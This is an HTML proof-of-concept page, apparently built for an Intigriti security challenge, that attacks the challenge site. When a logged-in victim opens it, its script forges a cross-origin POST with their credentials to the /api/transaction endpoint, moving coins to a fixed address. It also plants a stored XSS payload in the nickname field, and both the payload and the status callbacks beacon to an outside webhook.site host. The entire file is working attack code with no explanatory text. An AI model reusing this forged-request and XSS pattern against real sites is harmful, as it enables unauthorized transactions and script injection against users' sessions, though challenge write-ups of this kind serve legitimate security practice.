<!DOCTYPE html>
<html>
<head><title>PoC</title></head>
<body>
<script>
const BASE = 'https://challenge-0126.intigriti.io';
const WEBHOOK = 'https://webhook.site/fd042032-f1e9-404c-b9b1-8fb39614db44';

// XSS payload
const xss = `<img src=x onerror="alert('gigawatz');new Image().src='${WEBHOOK}/?xss=1'">`;

// Direct API call - bypass checkout.html restrictions
fetch(`${BASE}/api/transaction`, {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({
    toAddress: '10b5c9290725eeed3976d5dfe52fcbe23a',
    currency: '1337COIN',
    amount: 1,
    nickname: xss
  })
}).then(r => r.json()).then(d => {
  new Image().src = `${WEBHOOK}/?tx_status=ok`;
  window.location = `${BASE}/marketwatch.html`;
}).catch(e => {
  new Image().src = `${WEBHOOK}/?tx_error=${encodeURIComponent(e.message)}`;
  window.location = `${BASE}/marketwatch.html`;
});
</script>
</body>
</html>
